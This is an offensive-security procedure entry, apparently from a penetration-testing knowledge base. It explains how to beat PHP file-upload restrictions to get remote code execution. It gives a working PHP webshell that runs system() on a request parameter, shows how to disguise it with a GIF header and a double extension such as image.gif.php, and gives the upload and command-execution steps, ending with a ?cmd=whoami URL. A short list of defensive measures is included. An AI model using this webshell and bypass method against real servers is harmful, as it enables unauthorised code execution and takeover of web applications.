---
id: 7c35d2cd-358c-4819-b729-70d250fed7ed
name: Bypass-Insecure-PHP-Upload-Form-File-Restrictions
type: procedure
verified: true
submitted: true
created_at: '2019-10-09T21:26:59.469888+00:00'
updated_at: '2023-05-26T18:53:28.520787+00:00'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Python]]'
  - '[[Upload Malware]]'
sub_techniques: []
tags:
  - php
  - web-applications
  - file-upload
  - rce
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
---

# Bypass-Insecure-PHP-Upload-Form-File-Restrictions

## Summary

This procedure demonstrates how to bypass common file upload restrictions in insecure PHP-based web applications by modifying a PHP webshell payload to mimic a valid image file signature and using double extensions to evade whitelist filters, ultimately achieving remote code execution (RCE) on the target server.

## Description

Web applications often implement file upload functionality with restrictions based on MIME types, file extensions, or magic bytes to prevent malicious uploads. However, poor implementation—such as incomplete validation of file contents or allowing double extensions—can allow attackers to upload executable PHP code disguised as benign files. This technique targets PHP applications where the server executes uploaded files if they contain valid PHP code, even if the extension suggests otherwise. It is commonly used in penetration testing to gain initial code execution on web servers. The approach involves prepending image magic bytes (e.g., GIF header) to a PHP webshell and naming the file to pass extension checks, exploiting the fact that PHP parsers ignore leading non-PHP content.

## Requirements

1. Access to a web-based file upload form on a PHP-enabled server (e.g., Apache with mod_php).
2. Knowledge of the upload directory or ability to guess it (often /uploads/ or similar).
3. A text editor or command-line tool to craft the payload file.
4. Network access to the target application (typically over HTTP/HTTPS).
5. Basic understanding of PHP execution and file handling in web servers.

## Defense

Defensive measures and detection strategies:

- Implement strict server-side validation: Check file contents beyond extensions using libraries like PHP's finfo() for true MIME type detection.
- Store uploads outside the web root or in non-executable directories, and rename files with random, non-executable extensions.
- Use web application firewalls (WAFs) to block suspicious upload patterns, such as double extensions or magic byte mismatches.
- Enable file upload scanning with antivirus or tools like ClamAV integrated into the upload handler.
- Log all uploads and monitor for execution attempts in access logs (e.g., look for direct access to uploaded files).

## Objectives

1. Upload a malicious PHP payload disguised as an image to bypass restrictions.
2. Achieve remote code execution by accessing the uploaded file via a parameter like ?cmd=command.
3. Verify successful bypass by executing system commands on the server.

## Instructions

### Step 1: Prepare the Base PHP Webshell Payload

**Context**: Start by creating a simple PHP webshell that executes system commands via HTTP requests. This payload uses $_REQUEST['cmd'] to capture and run commands passed in the URL.

**Code** ([[codes/PHP-System-Webshell]]):

```php
<?php system($_REQUEST['cmd']); ?>
```

> Save this content to a file, e.g., shell.php. This establishes the executable core of the upload.

### Step 2: Modify Payload to Bypass File Signature Checks

**Context**: Many upload forms validate the file's magic bytes to ensure it's an image. Prepend the GIF89a header (GIF8 followed by a newline) to the PHP code. PHP will ignore the leading bytes and execute the code when the file is accessed.

**Code** ([[codes/GIF-PHP-Webshell-Bypass]]):

```php
GIF8
<?php system($_REQUEST['cmd']); ?>
```

> Create a new file with this content. The GIF header tricks signature-based checks into accepting it as an image, while the PHP code remains functional.

### Step 3: Craft Filename to Bypass Extension Whitelists

**Context**: If the form whitelists extensions like .gif or .jpg, use a double extension such as shell.gif.php. Some misconfigured servers will strip or ignore the .php part during upload but serve it with PHP execution enabled.

> Rename the modified payload file from Step 2 to something like image.gif.php. This exploits parsers that allow extensions after a benign one.

### Step 4: Upload the Modified File

**Context**: Use the web application's upload form to submit the crafted file. Intercept if needed with a proxy to inspect responses.

> Select the image.gif.php file in the upload form and submit. Monitor for success messages or errors indicating rejection.

### Step 5: Locate and Access the Uploaded File

**Context**: Determine the upload path (often revealed in success messages or predictable like /uploads/). Access the file directly via browser or curl to test execution.

> If uploaded to /uploads/image.gif.php, navigate to http://target.com/uploads/image.gif.php?cmd=whoami. The server should execute the command and return output.

> If the exact path is unknown, check source code, error messages, or common directories (/tmp/, /var/www/uploads/).
